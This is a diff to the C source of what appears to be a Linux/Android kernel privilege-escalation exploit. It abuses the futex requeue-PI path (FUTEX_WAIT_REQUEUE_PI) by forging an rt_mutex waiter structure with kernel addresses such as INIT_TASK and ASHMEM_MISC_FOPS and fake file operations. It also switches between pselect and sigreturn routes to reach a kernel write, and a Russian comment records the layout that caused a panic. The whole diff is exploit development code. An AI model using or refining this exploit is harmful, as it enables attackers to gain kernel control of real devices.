@@ -30,10 +30,7 @@ static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext)
 {
     (void)sig; (void)info;
     ucontext_t *uc = (ucontext_t *)ucontext;
-    ucontext_t *uc = (ucontext_t *)ucontext;
     mcontext_t *mc = &uc->uc_mcontext;
-    unsigned char *base = (unsigned char *)mc;
-
     unsigned char *base = (unsigned char *)mc;
 
     for (int off = 0; off < 1024; off += 8) {
@@ -63,16 +60,14 @@ void do_sigreturn_fake_lock_route(void)
 
     memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
 
-    /* ТОЧНЫЙ layout, который вызвал panic в rt_mutex_adjust_prio_chain */
-    put64(g_fake_waiter, 0x10, pselect_write_value());   /* tree_pc */
-    put64(g_fake_waiter, 0x18, 0);                        /* tree_right */
-    put64(g_fake_waiter, 0x20, pselect_write_target());   /* tree_left */
-    put64(g_fake_waiter, 0x28, pselect_write_value());    /* pi_parent */
-    put64(g_fake_waiter, 0x30, 0);                        /* pi_right */
-    put64(g_fake_waiter, 0x38, pselect_write_target());   /* pi_left */
-    put64(g_fake_waiter, 0x40, text_addr(INIT_TASK));     /* task */
-    put64(g_fake_waiter, 0x48, fake_lock);                /* lock */
-    put64(g_fake_waiter, 0x50, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3); /* prio */
+    put_fake_waiter(g_fake_waiter, 0,
+                    1, 0, 0,                       /* tree: black root, no children */
+                    fake_fops,                     /* pi_parent */
+                    data_addr(ASHMEM_MISC_FOPS),   /* pi_right */
+                    0,                             /* pi_left */
+                    text_addr(INIT_TASK),          /* task */
+                    fake_lock,                     /* lock */
+                    FAKE_WAITER_PRIO);             /* prio */
 
     struct sigaction sa = {0};
     sa.sa_sigaction = sigreturn_handler;
@@ -137,7 +132,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
 
-  do_pselect_fake_lock_route();
+  //do_pselect_fake_lock_route();
   do_sigreturn_fake_lock_route();
   atomic_store(&route_done, 1);
 
